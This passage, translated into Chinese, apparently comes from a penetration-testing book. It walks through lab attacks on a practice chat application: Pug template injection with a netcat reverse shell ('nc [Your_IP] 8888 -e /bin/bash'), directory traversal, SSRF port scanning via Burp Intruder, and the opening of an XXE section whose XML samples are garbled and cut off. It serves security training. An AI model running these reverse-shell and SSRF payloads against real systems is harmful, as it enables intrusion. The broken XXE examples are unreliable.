-var x = global.process.mainModule.require
使用子进程模块使我们能够通过运行任何系统命令来访问操作系统功能：
-x('child_process').exec('nc [Your_IP] 8888 -e /bin/bash')
RCE 上传攻击：
转到 http://chat:3000 并使用任何有效帐户登录
使用以下信息上传文本文件。在 Pug 中，“-”字符表示执行 JavaScript。
-var x = global.process.mainModule.require
-x('child_process')。exec('nc [Your_IP] 8888 -e / bin / bash')
通过上传文件查看 Burp 中的请求和响应。你将注意到在响应 POST 请求中上传的文件的哈希值以及引用的 drouting。
在这个模板代码中，我们将 require 函数分配给 child_process.exec，它允许我们在操作系统级别上运行命令。此代码将使 Web 服务器连接到在端口8888上 [Your_IP] 上运行的监听器，并允许我们在 Web 服务器上运行 shell。
在攻击者计算机上，启动 shell 的 netcat 侦听器以连接回
nc -l -p 8888
我们通过在 /drouting 上运行端点来激活代码。在浏览器中，转到上传的哈希文件。 drouting 端点采用指定的 Pug 模板并呈现它。对我们来说幸运的是，我们上传的 Pug 模板包含我们的反向 Shell 。
在浏览器中，使用你从文件上载响应中恢复的文件访问 drouting 端点。我们使用目录遍历“../”来返回上一个目录，以便能够进入包含我们的恶意文件的 uploads 文件夹：
/drouting?filename=../uploads/[你的文件哈希]
回到你的终端监听 8888 端口并在你的 shell 里操作吧！
服务器端请求伪造（SSRF）
服务器端请求伪造（SSRF）是我认为通常被误解的漏洞之一，并且在术语方面，经常与跨站点请求伪造（CSRF）混淆。虽然这个漏洞已经存在了一段时间，但实际上还没有得到足够的讨论和重视，尤其它可以造成的相当严重的后果。让我们来看看它是什么以及为什么会造成严重的后果。
服务器端请求伪造通常被利用以访问本地系统，进入内部网络或允许某种移动。理解 SSRF 的最简单方法是通过一个例子讲述。假设你有一个公共 Web 应用程序，允许用户通过 URL 从 Internet 上下载配置文件图像。你登录该站点，转到你的个人资料，然后单击 Imgur（公共图像托管服务）的更新个人资料按钮。你提供图像的 URL（ 例如：https://i.imgur.com/FdtLoFI.jpg ）并点击提交。接下来发生的事情是服务器会创建一个全新的请求，转到 Imgur 站点，抓取图像（它可能会执行一些图像操作来调整图像-图像跟踪任何人的大小？），将其保存到服务器，并发送成功消息回到用户。如你所见，我们提供了一个 URL，服务器获取该 URL 并抓取图像，并将其上传到其数据库。
我们提供了最初的 Web 应用程序的 URL，以从外部资源中获取我们的个人资料图片。但是，如果我们将图像 URL 指向 http://127.0.0.1:80/favicon.ico 会发生什么？这将告诉服务器不是请求像 Imgur 这样的东西，而且从本地主机服务器（它本身）获取 favicon.ico 图片文件。如果我们能够获得返回包的值是 200 或使我们的个人资料图片成为本地的 favicon 图片，我们就知道我们可能发现了 SSRF。
由于它在80端口上工作，那么如果我们尝试连接到 http://127.0.0.1:8080 会发生什么情况（8080 是一个除 localhost 之外无法访问的端口）？这就是它变得有趣的地方。如果我们确实得到完整的 HTTP 请求/响应，并且我们可以在本地对8080端口发出 GET 请求，那么如果我们发现了一个易受攻击的 Jenkins 或 Apache Tomcat 服务会发生什么？即使这个端口没有被公开监听，我们可能也可以入侵这个环境。更好的是，我们或许可以开始请求内网IP：http://192.168.10.2-254 ，而不是127.0.0.1。回想一下那些返回了内网 IP 泄露的网络扫描结果，你对此不屑一顾。但是这正是它们重新发挥作用的地方，我们可以通过它们来使用内部网络服务。
SSRF 漏洞允许你可以执行以下操作：
在回环接口上访问服务
扫描内部网络和与这些服务的潜在交互方式（GET/POST/HEAD）
使用 FILE:// 读取服务器上的本地文件
使用 AWS Rest 接口（ http://bit.ly/2ELv5zZ ）
横向移动到内部环境中
在我们的下图中，我们发现 Web 应用程序上存在易受攻击的 SSRF，允许我们利用此漏洞：
让我们来看一个现实中的例子：
在你的聊天支持系统（ http://chat:3000/ ）Web 应用程序中，首先确保创建一个帐户并登录。
登录后，通过链接转到 Direct Message（DM）页面或直接通过 http://chat:3000/directmessage 。
在“链接”文本框中，放入 http://cyberspacekittens.com 等网站，然后单击预览链接。
你现在应该看到 http://cyberspacekittens.com 页面的呈现，但 URI 栏仍应指向我们的聊天应用程序。
这表明该站点容易受到 SSRF 的攻击。我们也可以尝试聊天：3000/ssrf?user=&comment=&link=http://127.0.0.1:3000 并指向 localhost。请注意，页面呈现了，我们现在正通过有漏洞的服务器上的 localhost 访问该站点。
我们知道应用程序本身正在监听3000端口。我们可以从外部对该系统进行 nmap 扫描，并发现当前没有其他 Web 端口正在监听，但是哪些服务仅仅对于 localhost 可用？要搞清楚这个问题，我们需要通过127.0.0.1的所有端口强制执行。我们可以通过使用 Burp Suite 和 Intruder 来实现这一目标。
在 Burp Suite 中，转到 Proxy/HTTP History 选项卡，找到我们上一个 SSRF 的请求包。
在 Request Body 上单击右键并发送给 Intruder。
Intruder 选项卡将亮起，转到 Intruder 选项卡，然后单击 clear。单击并突出显示端口“3000”，然后单击 add。你的 GET 请求应如下所示：
GET/ssrf?user=&comment=&link=http://127.0.0.1 :§3000§HTTP/ 1.1
单击 payload 选项卡，然后选择将 Payload 类型选择为 “Numbers”。我们将从28000端口转到28100。通常，你将测试所有端口，但让我们在实验的时候简化它吧。
From：28000
To：28100
Step：1
点击 Start Attack
你将看到端口28017的响应长度远大于所有其他请求。如果我们打开浏览器并转到：http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017 ，我们应该能够利用我们的 SSRF 并获得对 MongoDB Web 界面的访问权限。
你应该能够访问所有链接，但你必须记住你需要使用 SSRF。要访问 serverStatus( http://chat:3000/serverStatus?text=1 )，你必须使用 SSRF 攻击并转到此处：
http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1
服务器端请求伪造可能非常危险。虽然不是新的漏洞，但目前发现的 SSRF 漏洞数量越来越多。由于 SSRF 允许在基础设施内进行移动，这通常会导致某些重要的发现。
其他资源：
本地的很多编码：
http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf
Bug Bounty -     AirBNB
示例：http://bit.ly/2ELvJxp
XML 外部实体攻击（XXE）
XML 代表可扩展标记语言，旨在发送/存储易于阅读的数据。 XML eXternal Entities（XXE）是对应用程序中 XML 解析器的攻击。XML 解析常见于允许文件上传，解析 Office 文档，JSON 数据甚至 Flash 类型游戏的应用程序中。当允许 XML 解析时，不正确的验证可以授予攻击者读取文件的权限、导致拒绝服务攻击，甚至远程代码执行。从一个比较高的维度来看，应用程序具有以下需求：1) 解析用户提供的 XML 数据，2) 实体的系统标识符部分必须在文档类型声明(DTD)内，3) XML处理器必须验证/处理 DTD 并解析外部实体。
普通 XML 文件
恶意 XML 文件
\
\
\
\
\
\100\
]>
\
\&xxe;\
上面，我们有一个普通的 XML 文件和一个专门用来从系统的 /etc/passwd 文件中读取文件的恶意 XML。我们将看看是否可以在真实的 XML 请求中注入恶意 XML 请求。
XXE 实验：
由于自定义配置请求，有一个不同的 VMWare 虚拟机用于 XXE 攻击。这可以在这里找到：
http://thehackerplaybook.com/get.php?type=XXE-vm
下载后，在 VMWare 中打开虚拟机并启动它。在登录屏幕上，你无需登录，但你应该看到系统的 IP 地址。
转到浏览器：
通过 Burp Suite 代理所有流量
转到 URL：http://[IP of your Virtual Machine] 
拦截流量并点击 Hack the XML
如果在加载页面后查看页面的 HTML 源代码，你可以看到有一个通过 POST 请求提交的隐藏字段。XML 内容如下所示：
]>
 Hack The &book;
在这个例子中，我们指定它是 XML 1.0版本，DOCTYPE，指定根元素是 thp，!ELEMENT 指定任何类型，并且 !ENTITY 将 book 变量设置为“Universe”字符串。最后，在我们的 XML 输出中，我们希望从解析 XML 文件中打印出我们的实体。
这通常是你在发送 XML 数据的应用程序中看到的内容。由于我们控制具有 XML 请求的 POST 数据，因此我们可以尝试注入我们自己的恶意实体。默认情况下，大多数 XML 解析库都支持 SYSTEM 关键字，该关键字允许从 URI 读取数据(包括使用 file:// 协议 )。因此，我们可以创建自己的实体来制作在 /etc/passwd 上读取的文件。
原始 XML 文件
恶意 XML 文件
\
\
\